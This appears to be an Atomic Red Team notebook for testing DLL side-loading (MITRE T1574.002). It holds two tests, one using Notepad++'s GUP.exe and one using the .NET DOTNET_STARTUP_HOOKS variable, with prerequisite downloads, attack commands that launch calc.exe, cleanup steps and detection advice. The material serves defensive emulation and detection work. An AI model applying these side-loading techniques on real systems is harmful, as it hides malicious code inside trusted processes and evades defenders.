{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "890c0efc",
   "metadata": {},
   "source": "# T1574.002 - DLL Side-Loading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)"
  },
  {
   "cell_type": "markdown",
   "id": "6d8e9d03",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7bed58d7",
   "metadata": {},
   "source": "### Atomic Test #1 - DLL Side-Loading using the Notepad++ GUP.exe binary\nGUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Gup.exe binary must exist on disk at specified location (#{gup_executable})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true\" -OutFile \"PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db73e9dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "84c95e45",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1574.002\\bin\\GUP.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "724a32f9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "194068db",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /F /IM calculator.exe >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71afd04c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ed97ac0d",
   "metadata": {},
   "source": "### Atomic Test #2 - DLL Side-Loading using the dotnet startup hook environment variable\nUtilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: .Net SDK must be installed\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nwinget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null\necho.\n\n```\n##### Description: preloader must exist\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true\" -OutFile \"PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9da7094",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b044b23a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nset DOTNET_STARTUP_HOOKS=PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll\ndotnet -h > nul\necho.\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f576f647",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "8cf8362c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /F /IM calculator.exe >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "917b4580",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1574.002 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5836c7e4",
   "metadata": {},
   "source": "## Detection\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}